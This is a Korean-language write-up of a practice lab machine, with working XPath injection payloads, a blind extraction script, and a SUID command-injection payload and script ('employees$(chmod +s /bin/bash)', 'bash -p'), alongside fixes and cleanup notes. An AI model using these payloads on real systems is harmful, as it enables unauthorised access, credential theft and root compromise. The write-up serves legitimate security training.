---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/enum/dirbust
  - tech/web/auth
  - tech/web/xpathi
  - tech/web/cmd-injection
  - tech/lin/suid
type: machine
platform: pg
os: linux
ip: 192.168.248.202
ports: [22, 80]
services: [http, ssh]
status: solved
manual_tags: true
manual_cves: true
tech_count: 5
---

> [!info] 요약
> 타겟 `192.168.248.202` · Linux(Ubuntu 20.04.4 LTS, 커널 5.4.0-122-generic) · Fundamental · 플래그 2개
> 진입점: `register.php` 에 `@wheels.service` 도메인 이메일로 가입 → employee 권한 세션으로 `portal.php` 진입 → 포털 검색 파라미터 `work` 의 XPath injection 으로 `../Search/works.xml` 평문 비밀번호 덤프 → `ssh bob:Iamrockinginmyroom1212`
> 권한상승: SUID+SGID 커스텀 바이너리 `/opt/get-list` 의 `system()` 명령주입 — `;`·`|`·`&` 문자 필터를 명령치환 `$()` 로 우회 → `chmod +s /bin/bash` → `bash -p`
> 플래그: user `dad9316cbb189a7deeeaf3106eaf489d` · root `f7769b4377f22a16f5ec85e7da8c4aca` (2026-08-21 인스턴스)
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.202

### Initial Access – 가입 이메일 도메인으로 걸린 권한 게이트를 통과한 뒤 포털 검색의 XPath injection 으로 평문 자격증명 저장소를 덤프

**Vulnerability Explanation:** 두 취약점이 체인됨.
- employee 권한 게이트가 「역할 컬럼」이 아니라 **가입 이메일의 도메인**(`@wheels.service`)으로 판정됨. 도메인은 클라이언트가 회원가입 폼에서 임의 지정 가능한 값이고, 그 도메인은 사이트 푸터(`info@wheels.service`)에 그대로 노출돼 있음 = 접근제어 우회
- `portal.php` 의 「Filter Users By Services」 검색이 사용자 입력 `$work` 를 XPath 식에 문자열 결합으로 넣음(`contains(service, '$work')`) — **XPath injection**. 결과 노드가 화면 표에 그대로 렌더돼 in-band 덤프와 boolean 오라클이 둘 다 성립
- 조회 대상 `../Search/works.xml` 이 직원 비밀번호를 **평문**으로 보관. 포털 검색 기능은 MySQL 을 아예 보지 않음 = 저장소 이원화. `[가정]` MySQL 쪽 해시가 bcrypt 라는 것은 로그인 응답 ≈0.4s/try 라는 **지연 신호에서 추론**한 것이고, users 테이블을 덤프해 해시 문자열을 확인한 적은 없음

**Vulnerability Fix:**
- XPath 식에 사용자 입력을 문자열 결합하지 말 것. 파라미터 바인딩을 쓰거나 화이트리스트(`car`/`bike`)를 **실제로 강제**할 것 — 현재 코드는 불일치 시 경고만 `echo` 하고 그대로 진행함
- 비밀번호를 평문 XML 로 보관하지 말 것. DB 쪽에서 해싱을 해도 병렬 XML 저장소가 평문이면 해싱이 무의미
- 권한 게이트를 클라이언트가 지정하는 이메일 도메인에 걸지 말 것. 서버측 역할 부여·초대 기반으로 전환

**Severity:** High — 무인증 회원가입만으로 접근제어를 우회하고, 인증 후 XPath injection 으로 평문 자격증명 전량 탈취 → SSH 로 즉시 계정 탈취

**Steps to reproduce the attack:**
1. `register.php` 에 `email=<임의>@wheels.service` 로 가입 후 로그인 → `portal.php` 본문 열림
2. `portal.php?work=car'` 로 `Invalid expression` 확인 → 홀수 따옴표 확정
3. `work=x') or ('1'='1` 로 전체 employee 노드 덤프(6명)
4. `substring()` blind 오라클로 각 노드 3번째 자식(`password`) 평문 추출
5. `ssh bob@192.168.248.202` 에 `Iamrockinginmyroom1212` 재사용

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.202 | TCP: 22, 80 |

`-p-` 전수 스캔에서도 2포트뿐. 나머지 65533 포트는 closed(reset).

```bash
ssh kali@10.44.44.128 "cd ~/PG/Wheels && nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.202"
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Wheels - Car Repair Services
```
— 출처: `~/PG/Wheels/nmap.log`

**버전 판정 독립 근거 2개** — ① nmap `-sCV` 배너 `Apache/2.4.41 (Ubuntu)` ② HTTP 응답 헤더 `Server: Apache/2.4.41 (Ubuntu)`(`login_hdr.txt`). 셸 확보 후 `/etc/os-release` 로 3차 확인됨(`Ubuntu 20.04.4 LTS`, 커널 `5.4.0-122-generic`).

Apache 2.4.41 은 path traversal 계열 대상이 아님 — CVE-2021-41773 은 **2.4.49 단독**, CVE-2021-42013 은 그 불완전 수정으로 나온 **2.4.50** 이 대상임. 버전으로 거름.

디렉터리 열거(gobuster, common → medium → raft):

```text
/index.html           (Status: 200) [Size: 37054]
/img                  (Status: 301) [Size: 316] [--> http://192.168.248.202/img/]
/login.php            (Status: 200) [Size: 7937]
/register.php         (Status: 200) [Size: 8172]
/assets               (Status: 301) [Size: 319] [--> http://192.168.248.202/assets/]
/portal.php           (Status: 302) [Size: 0] [--> login.php]
/css                  (Status: 301) [Size: 316] [--> http://192.168.248.202/css/]
/lib                  (Status: 301) [Size: 316] [--> http://192.168.248.202/lib/]
/js                   (Status: 301) [Size: 315] [--> http://192.168.248.202/js/]
/config.php           (Status: 200) [Size: 0]
/server-status        (Status: 403) [Size: 280]
```
— 출처: `~/PG/Wheels/gobuster_root.txt`

기성 Bootstrap 템플릿(`lib/`·`css/`·`js/` 구성, 소스에 `<!-- Template Stylesheet -->` 주석) 위에 커스텀 PHP 인증을 얹은 구조. 사이트 브랜드는 `Wheels CarService`(`login_resp.html:49`) — `[가정]` 어느 배포 템플릿인지는 크레딧 표기가 없어 특정하지 못했고, 특정할 필요도 없었음. 워드리스트 3종(common → medium → raft) 을 다 돌렸으나 위 목록 외 엔드포인트 없음. **인증 세션 상태로 재실행한 산출물은 남아 있지 않음** — 회수된 gobuster 결과는 무인증 1건(`gobuster_root.txt`)뿐임. `assets/` 하위는 `check.php`(로그인 여부만 검사 — 인증 시 200 공백, 미인증 시 302 → `login.php`) · `header.php` · `footer.php`. `config.php` 는 200 이지만 본문 0바이트(PHP 가 실행되고 출력이 없음).

`register.php` 폼 필드 3개:

```html
<input type="text" name="username" pattern="[a-zA-Z0-9]+" required />
<input type="email" name="email" required />
<input type="password" name="password" required />
```
— 출처: `~/PG/Wheels/reg_resp.html`

`pattern` 은 클라이언트 검증뿐이고 서버는 강제하지 않음. **UNIQUE 제약은 email 에만** 걸려 있음(중복 시 `already registered`) — username 중복은 허용됨. 즉 로컬파트만 바꾸면 같은 도메인의 계정을 얼마든지 찍어낼 수 있음.

푸터에 `info@wheels.service` 노출(`login_resp.html`·`reg_resp.html` 양쪽). **이 도메인이 뒤의 권한 게이트 열쇠**였음.

`portal.php` 는 "Employee Portal". 일반 이메일로 가입한 계정은 로그인해도 본문이 23바이트뿐:

```text
<h1>Access Denied</h1>
```
— 출처: `~/PG/Wheels/portal.html`

스크린샷 없음 — 이 박스는 헤드리스 SSH 로만 작업했고 정지 뒤에는 재촬영 불가.

### Initial Access – 이메일 도메인 게이트 → XPath injection

#### 게이트 통과

`register.php` 에 `email=<임의>@wheels.service` 로 가입하면 로그인 세션에 employee 권한이 붙어 포털 본문이 열림. 실제 사용한 형태(추출 스크립트의 세션 준비 구간):

```python
u = "dp" + str(int(time.time()))
s.post(T + "/register.php", data={"username": u, "email": u + "@wheels.service", "password": "P", "register": "register"})
s.post(T + "/login.php", data={"username": u, "password": "P", "login": "login"})
```
— 출처: `~/PG/Wheels/dump2.py`

로컬파트에 타임스탬프를 붙여 email UNIQUE 를 회피 — 재실행할 때마다 새 employee 계정이 생성됨.

#### 주입점

`portal.php` 의 검색 폼은 `../Search/works.xml` 을 XPath 로 조회함. bob 셸 확보 후 회수한 소스:

```php
$work = $_REQUEST["work"];
error_reporting(E_ALL); ini_set('display_errors', '1');

if (($work != 'car') and ($work != 'bike')){
    echo 'XML Error; No ',$work,' entity found';
};

$xml = simplexml_load_file("../Search/works.xml");

$result = $xml->xpath("//work[contains(service, '$work')]/employee");
```
— 출처: `~/PG/Wheels/websrc_and_cleanup.txt` (`/var/www/html/portal.php` 55–80행)

- 화이트리스트 검사가 있으나 **`echo` 만 하고 `exit` 하지 않음** — 불일치해도 그대로 XPath 조회로 진행
- `$work` 가 작은따옴표 안에 그대로 결합됨. `work=car'` → `SimpleXMLElement::xpath(): Invalid expression`(홀수 따옴표 확정). `display_errors=1` 이라 에러가 화면에 그대로 뜸
- 결과 노드가 표로 렌더되므로 **boolean 오라클 + in-band 덤프**가 둘 다 성립

`works.xml` 구조 — 각 `work` 의 자식 4개(`id`·`employee`·`password`·`service`), 비밀번호가 평문:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<works>
	<work>
		<id>1</id>
		<employee>bob</employee>
		<password>Iamrockinginmyroom1212</password>
		<service>car</service>
	</work>
	<work>
		<id>2</id>
		<employee>alice</employee>
		<password>iamarabbitholeand7875</password>
		<service>car</service>
	</work>
	<work>
		<id>3</id>
		<employee>john</employee>
		<password>johnloveseverontr8932</password>
		<service>car</service>
	</work>
	<work>
		<id>4</id>
		<employee>dan</employee>
		<password>lokieismyfav!@#12</password>
		<service>bike</service>
	</work>
	<work>
		<id>5</id>
		<employee>alex</employee>
		<password>alreadydead$%^234</password>
		<service>bike</service>
	</work>
	<work>
		<id>6</id>
		<employee>selene</employee>
		<password>lasagama90809!@</password>
		<service>bike</service>
	</work>
</works>
```
— 출처: `~/PG/Wheels/works_xml.txt` (권한상승 후 `cat /var/www/Search/works.xml` 로 사후 회수. 익스플로잇 시점에는 이 파일을 읽을 수 없었고, 구조는 blind 추출로 역산했음)

#### 페이로드 조각내기

전체 employee 덤프:

```text
GET /portal.php?work=x') or ('1'='1&action=search
```

→ 서버가 조립하는 식은 `//work[contains(service,'x') or ('1'='1')]/employee` → 6명 전원 반환(bob·alice·john / dan·alex·selene).

⚠️ 이 요청의 **응답 본문은 파일로 저장하지 않았음.** 6명 명단이 맞다는 근거는 ① `dump2.py` 의 판정 정규식이 그 6개 이름을 열거하고 있다는 것 ② 권한상승 뒤 회수한 `works_xml.txt` 가 같은 6명이라는 것 두 가지임. 위 GET 줄은 저장된 응답이 아니라 **당시 보낸 페이로드를 재구성한 것**임.

조각 역할:
- `x')` — `contains(service, '` 뒤에서 인자와 술어 괄호를 **닫아** `contains(service,'x')` 를 완성
- `or ('1'='1` — 항상 참인 술어를 붙임. 뒤에 원본이 남긴 `')]` 가 이어져 괄호·따옴표가 맞아떨어짐
- 닫는 따옴표·괄호를 **직접 쓰지 않는 것**이 요령임. 원본 문자열의 잔여분을 그대로 소비시켜야 식이 성립함

평문 password blind 추출 — 자식 노드 3번째가 `password`:

```text
work = zzz') or (*='bob' and (substring(*[3],<i>,1)='<c>')) or ('1'='2
```

- `zzz')` — 원래 술어를 항상 거짓으로 만듦(`contains(service,'zzz')`)
- `or (*='bob' and ...)` — `*='bob'` 로 대상 노드를 bob 의 `work` 로 한정. `*` 는 자식 아무거나 이므로 employee 값이 bob 인 노드만 매칭
- `or ('1'='2` — 꼬리의 잔여 `')]` 를 소비하면서 항상 거짓. 참 조건은 가운데 항 하나뿐
- 결과 표에 대상이 나타나면 그 글자가 참. 한 글자씩 회수

수동 대안(자동 도구 없이 브라우저·curl 만으로) — 위 `work` 값을 URL 인코딩해 GET 으로 보내고 응답 본문에 `>bob<` 가 있는지만 보면 됨. 문자셋을 `a-zA-Z0-9` + 기호로 잡고 `<i>` 를 1부터 올림. 길이는 `string-length(*[3])=<n>` 을 같은 오라클로 이분·순차 탐색.

실제로는 이 절차를 스크립트로 돌림:

```python
def oracle(cond):
    w = "zzz') or (%s) or ('1'='2" % cond
    r = s.get(T + "/portal.php", params={"work": w, "action": "search"})
    seg = r.text.split("entity found")[-1]
    return bool(re.search(r">(bob|alice|john|dan|alex|selene)<", seg))

def bob(cond):
    return oracle("*='bob' and (%s)" % cond)
```
— 출처: `~/PG/Wheels/dump2.py` (노드명까지 함께 뽑아 `local-name(*[k])` 로 스키마를 역산함)

회수 결과 `bob : Iamrockinginmyroom1212`. XML 이 평문이라 **MySQL 쪽 해시를 건드릴 필요가 아예 없었음.**

`config.php` 의 DB 자격증명은 진입·권한상승 어느 쪽에도 불필요했음(사후 회수분):

```php
    define('USER', 'wheels');
    define('PASSWORD', 'CanRipperCrackthis?09');
    define('HOST', 'localhost');
    define('DATABASE', 'wheels');
```
— 출처: `~/PG/Wheels/websrc_and_cleanup.txt` (`/var/www/html/config.php`)

비밀번호 문자열 자체가 `CanRipperCrackthis?09` — John/hashcat 크랙으로 유인하는 미끼 문구임. 실제 정답 경로는 크랙이 아니라 XML 평문 읽기였음.

⚠️ `sqlmap` 은 시험 금지지만 XPath injection 은 애초에 대상 밖이고, 이 박스는 처음부터 수동·자작 스크립트로 진행함.

#### SSH

XML 의 6명 중 OS 계정이 있는 것은 `bob` 하나(나머지 5명은 XML 전용 — `/etc/passwd` 에 없음).

```bash
sshpass -p 'Iamrockinginmyroom1212' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null bob@192.168.248.202
```

**Local.txt value:** `dad9316cbb189a7deeeaf3106eaf489d`

```text
bob
uid=1000(bob) gid=1000(bob) groups=1000(bob)
wheels
192.168.248.202 
Thu 20 Aug 2026 07:11:31 PM UTC
---
-rw-r--r-- 1 bob bob 33 Aug 20 17:29 /home/bob/local.txt
dad9316cbb189a7deeeaf3106eaf489d
```
— 출처: `~/PG/Wheels/proof_user.txt` (`whoami; id; hostname; hostname -I; date; ls -l; cat` 을 한 명령으로 묶은 출력)

`sudo -n` 은 비밀번호를 요구함(NOPASSWD 엔트리 없음). bob 은 자기 그룹(`groups=1000(bob)`)뿐이라 그룹 기반으로 올릴 여지도 없음 `[가정]` — `sudo -l` 을 비밀번호와 함께 실제로 돌려 sudoers 전문을 본 것은 아님.

```text
===== SUDO =====
sudo: a password is required
```
— 출처: `~/PG/Wheels/harvest_bob.txt`

### Privilege Escalation – SUID `/opt/get-list` 명령주입

**Vulnerability Explanation:** `/opt/get-list` 는 root 소유 SUID+SGID 커스텀 C 바이너리.
- 사용자 입력을 `snprintf(cmd, 200, "/bin/cat /root/details/%s", buf)` 로 셸 명령 문자열에 끼워 넣고 `system()` 으로 실행 — **OS command injection**
- 입력 검증은 `strchr` 로 `;`(0x3b) · `|`(0x7c) · `&`(0x26) 세 글자를 막고, `strstr` 로 `customers` 또는 `employees` 포함을 요구하는 것이 전부. **명령치환 `` $() ``·백틱은 막지 않음**
- `system()` 직전에 `setuid(geteuid())` 를 호출해 실uid 까지 0 으로 올림 → 주입된 명령이 root 로 실행됨(`system()` 이 부르는 `sh` 가 euid 만 0 인 상태를 떨어뜨리는 문제 자체가 발생하지 않음)

**Vulnerability Fix:**
- `system()` + 포맷문자열 조합을 제거하고 `execve()` 에 인자 배열로 넘길 것. 파일명은 블랙리스트가 아니라 화이트리스트(`customers`·`employees` 정확 일치)로 판정
- `/opt/get-list` 의 SUID·SGID 비트 제거. 목록 열람이 필요하면 해당 파일의 그룹 권한으로 해결

**Severity:** Critical — 로컬 사용자가 즉시 root 획득

**Steps to reproduce the attack:**
1. `find / -perm -4000` 으로 커스텀 SUID `/opt/get-list` 식별
2. Kali 로 바이너리를 회수해 `strings`·`objdump` 로 필터(`;`·`|`·`&`)와 `system()` 호출 확인
3. `echo 'employees$(chmod +s /bin/bash)' | /opt/get-list` 실행
4. `/bin/bash -p` 로 euid=0 셸 획득 후 `/root/proof.txt` 읽기
5. `chmod 755 /bin/bash` 로 원복

#### 열거

`harvest.sh` 회수 결과, 커스텀 SUID 는 하나뿐이고 나머지는 전부 snap/시스템 기본:

```text
===== SUID =====
/opt/get-list
/snap/snapd/23771/usr/lib/snapd/snap-confine
/snap/core18/2855/bin/mount
/snap/core18/2855/bin/ping
/snap/core18/2855/bin/su
...
===== SGID =====
/opt/get-list
/snap/core18/2855/sbin/pam_extrausers_chkpwd
...
===== CAPS =====
/snap/core20/1581/usr/bin/ping = cap_net_raw+ep
/snap/core20/1587/usr/bin/ping = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
===== CRON =====
no crontab for bob
```
— 출처: `~/PG/Wheels/harvest_bob.txt`. SUID·SGID 는 `...` 로 잘라 실었고 CAPS 는 전량임. 원문 순서 그대로임

`/opt/get-list` 가 SUID·SGID 목록에 **둘 다** 올라 있음 → 두 비트 모두 설정됨. bob 이 실행할 수 있었으므로 other 실행권도 있음(= `rws`/`r-s`/`r-x`, 실제 `ls -l` 출력은 회수 파일에 안 남음). 소유자가 root 라는 것은 익스플로잇 결과 `euid=0` 이 나온 것으로 확정됨. `getcap` 은 ping/traceroute 계열뿐이고 bob 크론도 없음 — 남는 단서는 이 바이너리 하나.

내부 LISTEN 도 확인:

```text
Netid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port Process  
tcp    LISTEN  0       511            0.0.0.0:80          0.0.0.0:*             
tcp    LISTEN  0       4096     127.0.0.53%lo:53          0.0.0.0:*             
tcp    LISTEN  0       128            0.0.0.0:22          0.0.0.0:*             
tcp    LISTEN  0       80           127.0.0.1:3306        0.0.0.0:*             
```
— 출처: `~/PG/Wheels/harvest_bob.txt` (`===== LISTEN =====` 의 tcp 행 전량. udp 1행 생략)

MySQL 은 루프백 전용이라 외부에서 안 보였을 뿐임. 다만 XML 경로로 이미 자격증명을 얻어 DB 를 팔 이유가 없었음.

#### 바이너리 분석

바이너리를 Kali 로 회수(`~/PG/Wheels/get-list`, 16808바이트)해 정적 분석. 문자열:

```text
Which List do you want to open? [customers/employees]: 
customers
employees
Opening File....
/bin/cat /root/details/%s
/dev/null
Oops something went wrong!!
...
get-list.c
```
— 출처: `strings -a ~/PG/Wheels/get-list` 의 `.rodata` 구간 연속 출력. `...` 뒤의 `get-list.c` 는 훨씬 뒤(디버그 심볼 구간)에 나오는 것을 이어 붙인 것임

`main` 디스어셈블 — 필터와 sink 가 그대로 드러남:

```text
    124f:	be 64 00 00 00       	mov    esi,0x64
    1257:	e8 74 fe ff ff       	call   10d0 <fgets@plt>
    1260:	be 3b 00 00 00       	mov    esi,0x3b
    1268:	e8 03 fe ff ff       	call   1070 <strchr@plt>
    127a:	be 7c 00 00 00       	mov    esi,0x7c
    1282:	e8 e9 fd ff ff       	call   1070 <strchr@plt>
    1294:	be 26 00 00 00       	mov    esi,0x26
    129c:	e8 cf fd ff ff       	call   1070 <strchr@plt>
    12bb:	e8 40 fe ff ff       	call   1100 <strstr@plt>
    12d6:	e8 25 fe ff ff       	call   1100 <strstr@plt>
    1418:	be c8 00 00 00       	mov    esi,0xc8
    1425:	e8 66 fc ff ff       	call   1090 <snprintf@plt>
    1462:	e8 49 fc ff ff       	call   10b0 <geteuid@plt>
    1467:	89 c7                	mov    edi,eax
    1469:	e8 82 fc ff ff       	call   10f0 <setuid@plt>
    1478:	e8 d3 fb ff ff       	call   1050 <system@plt>
```
— 출처: `objdump -d -M intel ~/PG/Wheels/get-list` 의 `<main>`(`0x1209`–`0x14d5`) 에서 **필터·sink 에 해당하는 행만 발췌**한 것(주소·바이트·니모닉은 원문 그대로). 발췌 과정에서 `puts`·`printf`·`open`·`dup`·`dup2`·`write`·`close` 호출과 스택 0 초기화 구간은 뺌

읽는 법 — `strchr` 의 두 번째 인자(`esi`)가 곧 금지 문자임: `0x3b`=`;` · `0x7c`=`|` · `0x26`=`&`. `strstr` 두 번은 `customers`/`employees` 포함 검사이고, 첫 번째가 맞으면 두 번째를 건너뛰는 OR 구조임. `fgets` 버퍼 0x64(100바이트), `snprintf` 상한 0xc8(200바이트). 마지막 세 줄이 `geteuid()` → `setuid()` → `system()` 순서.

발췌에서 뺀 구간 중 하나는 알아둘 값이 있음 — `system()` 직전에 `open("/dev/null", 0x401)` → `dup(2)` → `dup2(fd, 2)` 가 있어 **주입한 명령의 stderr 가 `/dev/null` 로 버려짐**. `chmod` 가 실패해도 화면에 아무것도 안 뜨므로, 성공 판정은 출력이 아니라 `ls -l /bin/bash` 로 해야 함.

#### 실행

**페이로드**: `employees$(chmod +s /bin/bash)`
- `employees` 포함 → `strstr` 통과
- `;`·`|`·`&` 없음 → `strchr` 세 개 전부 통과
- 필터는 입력 **버퍼 전체**를 보므로 `$()` 안쪽에서도 `;`·`|`·`&` 로 명령을 이어붙일 수 없음. ⚠️ `$()` 문법이 `;` 를 금지하는 것이 **아님** — Kali 에서 `bash -c 'echo "A: $(id -u; echo second)"'` 는 정상 동작함(직접 실행해 확인). 여기서 막는 것은 `strchr` 필터임
- 그래서 연산자 없이 이어붙이려면 `$()` 를 여러 번 쓰는 수밖에 없는데, `/bin/bash` 를 그 자리에서 setuid 로 만들면 한 번으로 끝남

```bash
P='Iamrockinginmyroom1212'
S="sshpass -p $P ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null bob@192.168.248.202"
echo "=== mount nosuid check on /tmp ==="
$S "mount | grep -E ' /tmp | /dev/shm ' || echo 'no separate /tmp'"
echo "=== before ==="; $S "ls -l /bin/bash"
echo "=== trigger exploit ==="
$S "echo 'employees\$(chmod +s /bin/bash)' | /opt/get-list"
echo "=== after ==="; $S "ls -l /bin/bash"
echo "=== root evidence via bash -p ==="
$S "/bin/bash -p -c 'whoami; id; hostname; hostname -I; date; echo ---; ls -l /root/proof.txt; cat /root/proof.txt'"
```
— 출처: `~/PG/Wheels/pwn.sh`

`bash -p` 의 `-p` 가 필수임 — 없으면 bash 가 실uid≠euid 를 감지해 특권을 버리고 euid 를 실uid 로 되돌림. `-p` 를 빼면 SUID 비트를 세워도 그냥 bob 셸이 됨.

**Proof.txt value:** `f7769b4377f22a16f5ec85e7da8c4aca`

```text
root
uid=1000(bob) gid=1000(bob) euid=0(root) egid=0(root) groups=0(root),1000(bob)
wheels
192.168.248.202 
Thu 20 Aug 2026 07:15:53 PM UTC
---
-rw------- 1 root root 33 Aug 20 17:29 /root/proof.txt
f7769b4377f22a16f5ec85e7da8c4aca
```
— 출처: `~/PG/Wheels/proof_root.txt`

> [!note] 왜 root 인가 — 추측 아님
> `/opt/get-list` 는 **직접 실행하는 SUID root 바이너리**(모드 `rws`, cron/서비스 아님)임. `setuid(geteuid())` 로 euid=0 을 실uid=0 으로 굳힌 뒤 `system()` 을 호출하므로 주입 명령이 root 로 실행됨. `proof_root.txt` 의 `euid=0(root) egid=0(root) groups=0(root),1000(bob)` 이 그 증거이고, `/root/proof.txt` 가 `-rw------- root root` 인데 읽힌 것도 같은 근거.

#### 경로 대안

- `/dev/shm` 은 `nosuid` 라 거기 새 SUID 바이너리를 두는 방식은 **실패함**
- `/tmp` 는 별도 마운트가 아니라 루트 `ext4` 위이므로 `nosuid` 가 아님 — 거기 새 SUID 바이너리를 두는 방식 **자체는 가능했음**. 다만 새 파일을 만들 필요 없이 기존 `/bin/bash` 에 in-place `chmod +s` → `bash -p` 하는 편이 남기는 흔적이 적고 원복이 쉬움

```text
/dev/sda2 on / type ext4 (rw,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
```
— 출처: `~/PG/Wheels/harvest_bob.txt` (`===== MOUNTS =====`)

### Post-Exploitation

| | 값 | 경로 | 어떤 셸로 읽었나 | 증거 파일 |
|---|---|---|---|---|
| Local.txt | `dad9316cbb189a7deeeaf3106eaf489d` | `/home/bob/local.txt` | SSH bob | `proof_user.txt` |
| Proof.txt | `f7769b4377f22a16f5ec85e7da8c4aca` | `/root/proof.txt` | setuid `bash -p`(euid=0) | `proof_root.txt` |

두 증거 파일 모두 `whoami`+`id`+`hostname`+`hostname -I`+`date`+`ls -l`+`cat` 을 **한 명령으로 묶은** 출력임.

⚠️ 셸 형태를 정확히 적어두면 — SSH 접속은 `sshpass … ssh … "<명령>"` 형태의 **비대화형 실행**이었고 pty 를 띄운 캡처는 남기지 않았음. 웹셸은 아니므로 시험 기준(웹셸로 읽은 플래그는 0점)에는 걸리지 않으나, 대화형 세션 캡처가 증거로 남아 있는 것은 아님.

**남긴 흔적**

원복 확인된 것:

```text
CONFIRMED REVERTED:
- /bin/bash setuid bit: set during exploit (chmod +s), reverted to 0755 (root:root). Verified ls -l = -rwxr-xr-x.
- /tmp/.h (harvest.sh output dir on target): removed (rm -rf). Verified absent.
- No leftover /tmp/rb or /tmp/rootbash (never created; /dev/shm & /tmp are nosuid anyway).
- No reverse-shell listeners opened (all access via ssh/sshpass).
```
— 출처: `~/PG/Wheels/traces_confirmed.log`

⚠️ 위 로그의 「`/dev/shm & /tmp are nosuid anyway`」는 **틀린 기술임.** 같은 세션의 `harvest_bob.txt` MOUNTS 절이 `/tmp` 를 별도 마운트로 잡지 않음(`/dev/sda2 on / type ext4 (rw,relatime)`) — `/tmp` 는 `nosuid` 가 아니었음. `/dev/shm` 만 `nosuid`. 결론(임시 SUID 바이너리를 만들지 않았음)은 그대로 유효함.

원복하지 못한 것 — 다음 인스턴스에서 소멸:
- 웹 열거 중 등록한 더미 계정(`admin`·`administrator`·`tester1`·`dupx`·이름 계열 다수 + 이메일 오라클 잔여)이 MySQL `wheels` DB 에 남음
- 웹 진입점 규명 때 만든 `<임의>@wheels.service` employee 계정들도 같은 DB 에 남음
- Apache access 로그에 Kali(`192.168.45.207`)발 스캔·브루트·XPath 주입 트래픽이 남음 — **삭제하지 않고 확인만** 함
- `/opt/get-list` 익스플로잇 호출은 bob 의 셸 히스토리에만 기록됨
- root 를 잡은 뒤에도 MySQL·XML 직접 편집으로 더미 행을 지우지는 **않음** — 위험 대비 이득이 없고 박스 리버트로 깨끗해짐

Kali 쪽: 리스너 0(전 구간 ssh/sshpass 경로라 리버스셸 자체를 안 씀), tmux 세션 0, NFS 마운트 없음.

## 관련

- 이 박스의 시행착오·손절 판단 — [[_PLAYBOOK#A-11. 자동 도구가 뱉은 값이 의심스럽다]] (whatweb 이 도메인을 `.serv` 로 오탐 · 병렬 사용자 열거의 거짓양성) · [[_PLAYBOOK#A-21. 웹 진입점에서 더 나갈 곳이 없다]] (게이트를 역할 컬럼으로 오판해 90분 소모) · [[_PLAYBOOK#A-22. 비번 해시를 못 깬다 (bcrypt 등)]] (응답 지연이 손절 신호)
- 기법 카드 — [[_PLAYBOOK#B-16. XPath injection]] · [[_PLAYBOOK#B-32. SUID 바이너리 명령주입 — 문자 필터는 `$()` 로 넘는다]]
- XPath injection — OWASP: <https://owasp.org/www-community/attacks/XPATH_Injection>
- PHP `SimpleXMLElement::xpath()`: <https://www.php.net/manual/en/simplexmlelement.xpath.php>
- GTFOBins `bash`(SUID): <https://gtfobins.github.io/gtfobins/bash/#suid>
- 산출물: `~/PG/Wheels/`(nmap·gobuster·`get-list` 바이너리·`dump.py`·`dump2.py`·`xpath.py`·`pwn.sh`·`finish.sh`·`harvest_bob.txt`·`proof_*`·`works_xml.txt`·`traces_confirmed.log`)
- 버전·도메인 판정은 독립 근거 2개로 — [[Hub]] · [[Levram]]
